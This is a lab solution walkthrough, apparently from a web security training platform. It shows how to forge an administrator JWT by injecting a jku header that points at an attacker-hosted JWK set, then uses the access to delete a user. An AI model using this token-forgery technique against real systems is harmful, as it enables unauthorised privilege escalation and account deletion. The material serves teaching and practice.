Solution:

1. Install the JWT Editor extension from the Burp BApp Store.
2. Log in using:
   wiener:peter
3. In Burp → Proxy → HTTP history, find the:
   GET /my-account
   request.
4. Send the request to Burp Repeater.
5. Change the path to:
   GET /admin
6. Go to the JWT Editor Keys tab.
7. Click New RSA Key.
8. Click Generate, then click OK to save the key.
9. Open the Exploit Server in the browser.
10. Replace the contents of the Body section with:
    {
      "keys": []
    }
11. In JWT Editor Keys, right-click the RSA key you generated and select:
    Copy Public Key as JWK.
12. Paste the copied JWK inside the keys array on the Exploit Server.
13. Store the exploit.
14. Return to the GET /admin request in Burp Repeater.
15. Open the JSON Web Token tab.
16. Replace the kid value in the JWT header with the kid value of the JWK uploaded to the Exploit Server.
17. Add the following parameter to the JWT header:
    "jku": "https://YOUR-EXPLOIT-SERVER/exploit"
18. Change the sub claim in the payload to:
    "sub": "administrator"
19. Click Sign.
20. Select the RSA key you generated.
21. Make sure Don't modify header is selected, then click OK.
22. Send the request:
    GET /admin
23. Find the delete endpoint in the response:
    /admin/delete?username=carlos
24. Send a request to:
    GET /admin/delete?username=carlos
25. The lab is solved.
